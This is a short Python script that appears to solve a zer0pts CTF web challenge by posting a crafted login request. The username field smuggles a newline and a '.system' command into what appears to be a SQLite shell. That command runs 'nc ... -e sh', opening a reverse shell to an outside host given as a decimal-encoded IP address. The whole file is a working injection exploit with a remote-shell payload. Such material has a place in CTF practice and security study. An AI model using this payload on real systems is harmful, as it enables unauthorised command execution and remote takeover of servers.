import requests

url = "http://web.ctf.zer0pts.com:8004"
username = '";\n.system nc 574827230 1 -e sh\n'
assert len(username) <= 32
data = {"username": username, "password": "hi"}
res = requests.post(f"{url}/login", data)
print(res.text)
